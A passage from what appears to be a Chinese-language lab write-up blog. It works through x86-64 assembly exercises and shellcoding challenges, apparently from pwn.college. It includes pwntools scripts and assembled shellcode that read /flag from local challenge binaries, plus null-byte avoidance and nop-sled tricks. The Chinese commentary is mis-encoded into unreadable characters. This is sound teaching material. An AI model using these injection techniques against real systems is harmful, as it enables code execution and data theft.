register.</td><td>scratch</td><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>Scratch register.</td><td>scratch</td><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td><em>r12</em></td><td><em>Preserved register.Â  You can use it, but you need to save and restore it.</em></td><td><em>preserved</em></td><td><em>r12</em></td><td><em>r12d</em></td><td><em>r12w</em></td><td><em>r12b</em></td></tr><tr><td><em>r13</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r13</em></td><td><em>r13d</em></td><td><em>r13w</em></td><td><em>r13b</em></td></tr><tr><td><em>r14</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r14</em></td><td><em>r14d</em></td><td><em>r14w</em></td><td><em>r14b</em></td></tr><tr><td><em>r15</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r15</em></td><td><em>r15d</em></td><td><em>r15w</em></td><td><em>r15b</em></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-å¼€å§‹å†…å­˜æ“ä½œ"><a href="#10-å¼€å§‹å†…å­˜æ“ä½œ" class="headerlink" title="10. å¼€å§‹å†…å­˜æ“ä½œ"></a>10. å¼€å§‹å†…å­˜æ“ä½œ</h2><p>æ³¨æ„addæ²¡æœ‰ <code>add mem, imm</code>è¿™ç§å½¢å¼, å› ä¸ºæ—¶é’Ÿå‘¨æœŸæ ¹æœ¬ä¸å¤Ÿ </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>11.ç®€å•çš„rax, eax, ax, ah, alçš„ä½¿ç”¨.</p><p>12.è¦æ³¨æ„æ—¶é’Ÿå‘¨æœŸçš„é—®é¢˜. å¸¸æ•°è¦å…ˆç§»åŠ¨åˆ°å¯„å­˜å™¨</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>13.åˆ©ç”¨åœ°å€åç§», ç®€å•çš„.</p><h2 id="14-16-æ ˆç›¸å…³æŒ‡ä»¤-å¤ªç®€å•äº†-éƒ½æ˜¯äº›åŸºç¡€é¢˜-è¿‡äº†å°±ç®—äº†"><a href="#14-16-æ ˆç›¸å…³æŒ‡ä»¤-å¤ªç®€å•äº†-éƒ½æ˜¯äº›åŸºç¡€é¢˜-è¿‡äº†å°±ç®—äº†" class="headerlink" title="14-16.æ ˆç›¸å…³æŒ‡ä»¤. å¤ªç®€å•äº†, éƒ½æ˜¯äº›åŸºç¡€é¢˜, è¿‡äº†å°±ç®—äº†"></a>14-16.æ ˆç›¸å…³æŒ‡ä»¤. å¤ªç®€å•äº†, éƒ½æ˜¯äº›åŸºç¡€é¢˜, è¿‡äº†å°±ç®—äº†</h2><h2 id="17-è·³è½¬"><a href="#17-è·³è½¬" class="headerlink" title="17. è·³è½¬"></a>17. è·³è½¬</h2><p>nopçš„æ•°é‡æ•°é”™äº†, è¯¶ä»–è¯´çš„æ˜¯0x51 bytes from current position, ä½†æ˜¯è¿™æŒ‡çš„æ˜¯jmpåé¢ä¸€æ¡æŒ‡ä»¤çš„åœ°å€. ä¸æ˜¯jmpçš„èµ·å§‹åœ°å€â€¦..</p><p>è¿˜è¦æ³¨æ„<code>ç»å¯¹è·³è½¬åªèƒ½æ˜¯é—´æ¥è·³è½¬(line 6)</code>( è¦å’Œ<code>æ¡ä»¶è·³è½¬åªèƒ½æ˜¯ç›´æ¥è·³è½¬</code>ä¸€èµ·è®°æ¸…æ¥š )</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>18.if-elif-elseè¿ç¯, è¦æ³¨æ„çš„æ˜¯ä»–è¯´[rdi]æ˜¯ä¸€ä¸ªåŒå­—, å¯èƒ½æ˜¯ä¸€ä¸ªè´Ÿæ•°, æ‰€ä»¥æˆ‘ç¬¬ä¸€æ¬¡å†™çš„<code>QWORD PTR</code>å°±é”™äº†, åªèƒ½æ˜¯<code>DWORD PTR</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                 </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>19.<strong>æ¡ä»¶è·³è½¬åªèƒ½æ˜¯ç›´æ¥è·³è½¬</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>20.æŠ˜è…¾äº†åŠå¤©, å‘ç°é¢˜ç›®æè¿°æœ‰é”™çš„åœ°æ–¹, è¿™é‡Œæ˜æ˜æ˜¯DWORD, è¯´æˆquad word.</p><p>è¿˜æœ‰ä¸€ç‚¹è¢«æˆ‘å¿½ç•¥äº†, å¦‚æœæŒ‰ç…§add eax, ebxçš„åšæ³•, <strong>é‚£ä¹ˆè¶…å‡ºå››å­—èŠ‚çš„éƒ¨åˆ†ä¼šè¢«èˆå¼ƒ</strong> </p><p>è¿™é‡Œæˆ‘æƒ³åˆ°çš„åšæ³•æ˜¯ç”¨eaxå–å‡ºåŒå­—æ•°æ®, ç„¶åç”¨raxåšåŠ æ³•.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #åœ¨è¿™é‡Œ</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>21.ç¡¬æ˜¯æ²¡æœ‰ç®€åŒ–æˆ</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="22-è°ƒç”¨"><a href="#22-è°ƒç”¨" class="headerlink" title="22.è°ƒç”¨"></a>22.è°ƒç”¨</h2><p>åˆæ˜¯æŠ˜è…¾äº†åŠå¤©, ä¸»è¦æ˜¯é€å­—èŠ‚æ¯”è¾ƒçš„, ä»é¢˜å¹²ä¹Ÿçœ‹ä¸å‡ºæ¥å•Š, å­¤é›¶é›¶çš„[src_addr]çœŸå°±æŒ‡ä¸€ä¸ªBYTE</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>23.å·æ‡’, ç”¨äº†åˆ«äººçš„ä»£ç , å¤ä¹ æ“ä½œç³»ç»Ÿå»äº†</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">;source code:<br>most_common_byte(src_addr, size):<br>    b = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i &lt;= size-<span class="hljs-number">1</span>:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += <span class="hljs-number">1</span><br>    b = <span class="hljs-number">0</span><br><br>    max_freq = <span class="hljs-number">0</span><br>    max_freq_byte = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> b &lt;= <span class="hljs-number">0xff</span>:<br>        <span class="hljs-keyword">if</span> [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    <span class="hljs-keyword">return</span> max_freq_byte<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h1 id="module-4-sc"><a href="#module-4-sc" class="headerlink" title="module 4-sc"></a>module 4-sc</h1><p>åŸºæœ¬å…¨åœ¨PPTé‡Œé¢.</p><h2 id="0-åŸºæœ¬æ“ä½œ"><a href="#0-åŸºæœ¬æ“ä½œ" class="headerlink" title="0.åŸºæœ¬æ“ä½œ"></a>0.åŸºæœ¬æ“ä½œ</h2><ul><li>intro:<ul><li><p>Buiding shellcode: just using pwntools.</p></li><li><p>Debugging: strace or gdb</p></li></ul></li><li>common challenge:<ul><li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p></li><li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p></li><li><p><strong>multistage shellcoding:</strong><br>read into later bytes; or read into <code>read(0, rip, 1000)</code> (using <code>lea rax, [rip]</code> get rip)</p></li><li><p><strong>Shellcode Mangling:</strong><br><u>work backwards</u>  or  <u>jump over some parts to avoid them</u>.</p></li><li><p><strong>Unable to speak:</strong><br>if you can communicate one bit, then you can communicate.<br>such as a exit code? maybe inefficient. or signal? or â€¦</p></li></ul></li><li>Remain injection points: JIT, jus-in-time, å³æ—¶.</li></ul><p>avoid null-bytes:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br><br>mov rsi, 0x1017eff3d8d4981 --&gt;<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br></code></pre></div></td></tr></table></figure><h2 id="1-å¼€å§‹"><a href="#1-å¼€å§‹" class="headerlink" title="1.å¼€å§‹"></a>1.å¼€å§‹</h2><p>éå¸¸ç›´æ¥çš„ä¸€é“é¢˜ç›®, ä¸è¿‡æˆ‘é‡æ–°è®¤è¯†äº†ä¸€ä¸‹shellcode, åŸæ¥amd64.openåšçš„äº‹æƒ…è¿˜åŒ…æ‹¬é˜²æ­¢æŒ‡ä»¤åºåˆ—ä¸­å‡ºç°<code>&#39;\0&#39;</code>, ä»¥å‰ç”¨çš„éƒ½æ²¡æœ‰ç»†æƒ³è¿™ä¸ªé—®é¢˜. ä¸è¿‡å‰ä¸¤é¢˜éƒ½æ˜¯ç”¨çš„readå‡½æ•°ç›´æ¥è¯»å–stdinç›´åˆ°eof, æ‰€ä»¥ä¸éœ€è¦æ‹…å¿ƒç©ºå­—ç¬¦çš„é—®é¢˜.<del>amd64.openè¿™ä¸ªå‡½æ•°æˆ‘éƒ½æ²¡æœ‰åœ¨æ–‡æ¡£é‡Œé¢æŸ¥åˆ°.</del> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#ç›´æ¥ä½¿ç”¨wildcard, ä¸è¿‡ä¼šåŒ¹é…åˆ°cå’Œbinary, é€‰æ‹©ç¬¬äºŒä¸ªå³å¯</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#æ‰“å¼€æ–‡ä»¶, raxå­˜å‚¨fd, ä»æ–‡ä»¶ä¸­è¯»å–åˆ°å†…å­˜ä¸­addr+0x100, ç„¶åå†™åˆ°stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•ç¨‹åºç›´æ¥ä»stdinè¯»å–bytesç„¶åå­˜å‚¨åˆ°æ•°ç»„ä¸­, æŠŠæ•°ç»„æŒ‡é’ˆè½¬æ¢æˆå‡½æ•°æŒ‡é’ˆè°ƒç”¨å³å¯æ‰§è¡Œshellcode.</p><p>é™„ä¸€ä¸ªasm, äº†è§£ä¸€ä¸‹åŸç†.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movabs rax, 0x101010101010101<br>push rax<br>movabs rax, 0x1010166606d672e # å†™å…¥&#x27;flag&#x27;å­—ç¬¦ä¸²<br>xor qword ptr [rsp], rax<br>mov rdi, rsp<br>xor edx, edx<br>xor esi, esi<br>push 2<br>pop rax<br>syscall    # open<br><br>mov rdi, rax<br>xor eax, eax<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>syscall # read<br><br>push 1<br>pop rdi<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>push 1<br>pop rax<br>syscall Â Â Â Â # write to stdout<br></code></pre></div></td></tr></table></figure><h2 id="2-emmmm"><a href="#2-emmmm" class="headerlink" title="2.emmmm"></a>2.emmmm</h2><blockquote><p>This challenge will <strong>randomly skip up to 0x800 bytes</strong> in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a <code>nop sled</code>.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">In [3]: asm(&#x27;nop&#x27;) <br>Out[3]: b&#x27;\x90&#x27;<br></code></pre></div></td></tr></table></figure><p>ä½¿ç”¨å³å¯¹é½, <code>fillchar=&#39;\x90â€™</code>. å³<code>payload = asm(shellcode).rjust(0x800, â€˜\90â€™);</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span 